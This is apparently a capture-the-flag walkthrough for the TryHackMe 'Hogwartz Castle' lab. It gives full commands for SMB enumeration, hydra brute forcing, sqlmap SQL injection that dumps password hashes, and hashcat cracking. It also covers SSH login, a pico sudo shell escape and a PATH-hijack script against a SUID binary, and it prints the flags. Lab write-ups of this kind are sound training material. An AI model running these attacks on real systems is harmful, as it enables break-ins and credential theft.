# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 20   | ssh     |
| 80   | http    |
| 139  | smb     |
| 445  | smb     |



# RECONNAISSANCE
---

We can begin by checking the smb protocol, maybe anonymous login is enabled:

![Pasted image 20250404171325.png](../../IMAGES/Pasted%20image%2020250404171325.png)

There we go, we got an interesting share: `sambashare`, let's check the files inside of it:


![Pasted image 20250404171351.png](../../IMAGES/Pasted%20image%2020250404171351.png)

We got two files, let's read them:


![Pasted image 20250404171408.png](../../IMAGES/Pasted%20image%2020250404171408.png)

`spellnames.txt` is a wordlist, it seems like we need to bruteforce some sort of login page, let's check the web application:

![Pasted image 20250404171441.png](../../IMAGES/Pasted%20image%2020250404171441.png)

Simple apache2 page, if we check source code, we can see the following:


![Pasted image 20250404171510.png](../../IMAGES/Pasted%20image%2020250404171510.png)

We got a subdomain, let's add it to `/etc/hosts`:

```
echo '10.10.196.103 hogwartz-castle.thm' | sudo tee -a /etc/hosts
```

If we go inside the subdomain, we can check this:

![Pasted image 20250404171657.png](../../IMAGES/Pasted%20image%2020250404171657.png)

We got the login page, based on that, we can craft the following hydra command to bruteforce:

```
hydra -l Hagrid -P /usr/share/wordlists/rockyou.txt hogwartz-castle.thm http-post-form "/login:user=^USER^&password=^PASS^:F=Incorrect Username or Password" -t 40
```

Unfortunately for us, nothing came from the scan, either with the other wordlist or other username, seems like bruteforcing may not be the way, what about fuzzing, we forgot fuzzing in the main page:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://castle.thm/FUZZ" -ic -c -t 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://castle.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
backup                  [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 399ms]
```

We got a `/backup` directory, let's keep a bit further:

```

ïŒƒ  ï€•  ~ ï”ï” ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://castle.thm/backup/FUZZ" -ic -c -t 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://castle.thm/backup/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
email                   [Status: 200, Size: 1527, Words: 236, Lines: 44, Duration: 670ms]
```

There we go, we got something interesting, an `email` directory, let's take a look:


We get the following contents:

```
Madeye,

It is done. I registered the name you requested below but changed the "s" to a "z". You should be good to go.

RME

--------
On Tue, Nov 24, 2020 at 8:54 AM Madeye Moody <ctf@madeye.ninja> wrote:
Mr. Roar M. Echo,

Sounds great! Thanks, your mentorship is exactly what we need to avoid legal troubles with the Ministry of Magic.

Magically Yours,
madeye

--------
On Tue, Nov 24, 2020 at 8:53 AM Roar May Echo <info@roarmayecho.com> wrote:
Madeye,

I don't think we can do "hogwarts" due to copyright issues, but letÃ¢â‚¬â„¢s go with "hogwartz", how does that sound?

Roar

--------
On Tue, Nov 24, 2020 at 8:52 AM Madeye Moody <ctf@madeye.ninja> wrote:
Dear Mr. Echo,

Thanks so much for helping me develop my castle for TryHackMe. I think it would be great to register the domain name of "hogwarts-castle.thm" for the box. I have been reading about virtual hosting in Apache and it's a great way to host multiple domains on the same server. The docs says that...

> The term Virtual Host refers to the practice of running more than one web site (such as 
> company1.example.com and company2.example.com) on a single machine. Virtual hosts can be 
> "IP-based", meaning that you have a different IP address for every web site, or "name-based", 
> meaning that you have multiple names running on each IP address. The fact that they are 
> running on the same physical server is not apparent to the end user.

You can read more here: https://httpd.apache.org/docs/2.4/vhosts/index.html

What do you think?

Thanks,
madeye
```

Nothing important, we are missing something, for example, we only tested for brute force in the login page but nothing else, what about `SQLI`:

![Pasted image 20250404173656.png](../../IMAGES/Pasted%20image%2020250404173656.png)

![Pasted image 20250404173707.png](../../IMAGES/Pasted%20image%2020250404173707.png)

There we go, `SQLI` is possible in this website, let's proceed to exploitation.




# EXPLOITATION
---


Since we already know we got `SQLI`, we can use `sqlmap` to speed up the process:


```
sqlmap -u 'http://hogwartz-castle.thm/login' --random-agent --method POST --data 'user=Harry&password=pass' -p user --skip passwrd --level 5 --risk 3 --dbms SQLite --dump -T users -C name,password,admin,notes --flush-session --threads 10 --no-cast --tamper unionalltounion --union-char 1337
```

From this, we can get a series of hashes, once we save all those hashes, we can proceed to crack them. There's a hint on how to crack them, it says:

```
My linux username is my first name, and password uses best64
```

So, by doing this, we can crack it using hashcat:

```
hashcat --force -m 1700 hashes2.txt spellnames.txt -r /usr/share/doc/hashcat/rules/best64.rule
```

We get the following:

```
b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885:wingardiumleviosa123
```

There we go, we got the credentials, since the username is the first name of him, we got some username on the sqlmap scan:

```
harry:wingardiumleviosa123
```


We can now go into ssh using those credentials:

![Pasted image 20250404182627.png](../../IMAGES/Pasted%20image%2020250404182627.png)

```
harry@hogwartz-castle:~$ cat user1.txt
RME{th3-b0Y-wHo-l1v3d-f409da6f55037fdc}
```


Let's start privilege escalation.



# PRIVILEGE ESCALATION
---


Let's check our sudo privileges:


```
harry@hogwartz-castle:~$ sudo -l
[sudo] password for harry:
Matching Defaults entries for harry on hogwartz-castle:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User harry may run the following commands on hogwartz-castle:
    (hermonine) /usr/bin/pico
    (hermonine) /usr/bin/pico
```

Weird, we can run `/usr/bin/pico` as user`hermonine`, let's check this on `gtfobins`:

![Pasted image 20250404182759.png](../../IMAGES/Pasted%20image%2020250404182759.png)

Let's do this:

```
sudo -u hermonine TERM=xterm /usr/bin/pico 
ctrl R ctrl X
reset; sh 1>&0 2>&0
```

![Pasted image 20250404183940.png](../../IMAGES/Pasted%20image%2020250404183940.png)

Let's get a more comfortable shell:

```
/usr/bin/script -qc /bin/bash /dev/null
```

![Pasted image 20250404183955.png](../../IMAGES/Pasted%20image%2020250404183955.png)

```
hermonine@hogwartz-castle:/home/hermonine$ cat user2.txt
RME{p1c0-iZ-oLd-sk00l-nANo-64e977c63cb574e6}
```


If we check `find / -perm -4000 2>/dev/null`, we can see this:

![Pasted image 20250404184310.png](../../IMAGES/Pasted%20image%2020250404184310.png)

Interesting, there's something called `/srv/time-turner/swagger`, let's take a look:

![Pasted image 20250404184352.png](../../IMAGES/Pasted%20image%2020250404184352.png)

It seems like some sort of RNG is happening behind this, we can analyze it with `ghidra` or test this other stuff:

```bash
echo '111' | /srv/time-turner/swagger | grep "of" | cut -f5 -d' ' | /srv/time-turner/swagger ;
```

##### **How the Hijack Works**:

- **Predictable RNG**:  
    The binary uses the input (e.g.,Â `111`) to generate its output. If the RNG is poorly implemented (e.g., uses input as a seed without proper entropy), the output becomes predictable.  
    
    Example:
    - InputÂ `111`Â â†’ OutputÂ `456`.
    - InputÂ `456`Â â†’ OutputÂ `789`.
        
- **Controlled Feedback**:  
    By extracting the output number and piping it back into the binary, the attacker forces the RNG into a deterministic sequence. This bypasses randomness.


![Pasted image 20250404184846.png](../../IMAGES/Pasted%20image%2020250404184846.png)


We can use the following to get `root.txt`, we can change the method and get our `authorized` to gain a shell as root, to the simplicity of things, let's simply read the flag:


```
TD=$(mktemp -d)
echo 'cat /root/root.txt' > "$TD/uname"
chmod a+x "$TD/uname"
export PATH=$TD:$PATH
echo 667 | /srv/time-turner/swagger | sed -n 2p | cut -d ' ' -f 5 | /srv/time-turner/swagger
```

We get this output:

```
Guess my number: Nice use of the time-turner!
This system architecture is RME{M@rK-3veRy-hOur-0135d3f8ab9fd5bf}
```

Root flag is:

```
RME{M@rK-3veRy-hOur-0135d3f8ab9fd5bf}
```


![Pasted image 20250404185921.png](../../IMAGES/Pasted%20image%2020250404185921.png)

